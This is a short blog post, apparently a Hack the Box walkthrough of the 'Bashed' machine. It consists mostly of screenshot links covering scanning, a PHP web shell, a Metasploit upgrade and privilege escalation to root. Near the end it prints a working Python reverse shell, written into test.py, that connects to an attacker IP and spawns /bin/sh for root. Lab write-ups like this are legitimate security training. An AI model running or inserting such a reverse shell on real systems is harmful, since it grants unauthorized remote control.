---
layout: post
title: Bashed by Hack the Box
meta:
category:
  - hack-the-box
image: card1-img.png
date: 2020-12-03
tags:
    - internal-inf
    - external-inf
    - nessus
    - scanning
    - host-discovery
    - port-scanning
permalink: blog/:title
---
<style>
  .hover-link:hover {
    
  }

  .hover-link {
    font-weight: bold;
    cursor: pointer;
    color: #05cfa3;
  }
</style>

![initial-nmap]({{ site.baseurl }}/assets/images/article-images/bashed-hack-the-box/initial-nmap.png "initial-nmap")

![nmap-follow-scan-all-http-scripts]({{ site.baseurl }}/assets/images/article-images/bashed-hack-the-box/nmap-follow-scan-all-http-scripts.png "nmap-follow-scan-all-http-scripts")

![apache-2.4.18-on-ubuntu]({{ site.baseurl }}/assets/images/article-images/bashed-hack-the-box/apache-2.4.18-on-ubuntu.png "apache-2.4.18-on-ubuntu")

![dev-subdomain]({{ site.baseurl }}/assets/images/article-images/bashed-hack-the-box/dev-subdomain.png "dev-subdomain")

![php-bash-shell]({{ site.baseurl }}/assets/images/article-images/bashed-hack-the-box/php-bash-shell.png "php-bash-shell")

![enumeration]({{ site.baseurl }}/assets/images/article-images/bashed-hack-the-box/enumeration.png "enumeration")

![create-shell]({{ site.baseurl }}/assets/images/article-images/bashed-hack-the-box/create-shell.png "create-shell")

![host-shell]({{ site.baseurl }}/assets/images/article-images/bashed-hack-the-box/host-shell.png "host-shell")

![web-delivery-metasploit]({{ site.baseurl }}/assets/images/article-images/bashed-hack-the-box/web-delivery-metasploit.png "web-delivery-metasploit")

![upgrade-metasploit-meterpreter]({{ site.baseurl }}/assets/images/article-images/bashed-hack-the-box/upgrade-metasploit-meterpreter.png "upgrade-metasploit-meterpreter")

![enumerate]({{ site.baseurl }}/assets/images/article-images/bashed-hack-the-box/enumerate.png "enumerate")

![sudo-l]({{ site.baseurl }}/assets/images/article-images/bashed-hack-the-box/sudo-l.png "sudo-l")

![tty-shell]({{ site.baseurl }}/assets/images/article-images/bashed-hack-the-box/tty-shell.png "tty-shell")

![files-owned-by-scriptmanager]({{ site.baseurl }}/assets/images/article-images/bashed-hack-the-box/files-owned-by-scriptmanager.png "files-owned-by-scriptmanager")

![file-run-by-root]({{ site.baseurl }}/assets/images/article-images/bashed-hack-the-box/file-run-by-root.png "file-run-by-root")

![spawn-shell-as-scriptmanager]({{ site.baseurl }}/assets/images/article-images/bashed-hack-the-box/spawn-shell-as-scriptmanager.png "spawn-shell-as-scriptmanager")

![content-discovery]({{ site.baseurl }}/assets/images/article-images/bashed-hack-the-box/content-discovery.png "content-discovery")

{% highlight Python %}
echo 'import socket,subprocess,os' > test.py
echo 's=socket.socket(socket.AF_INET,socket.SOCK_STREAM)' >> test.py
echo 's.connect(("10.10.14.26",4432)) ' >> test.py
echo 'os.dup2(s.fileno(),0)' >> test.py
echo 'os.dup2(s.fileno(),1)' >> test.py
echo 'os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);' >> test.py
{% endhighlight%}

![got-root]({{ site.baseurl }}/assets/images/article-images/bashed-hack-the-box/got-root.png "got-root")

![overide-test-py]({{ site.baseurl }}/assets/images/article-images/bashed-hack-the-box/overide-test-py.png "overide-test-py")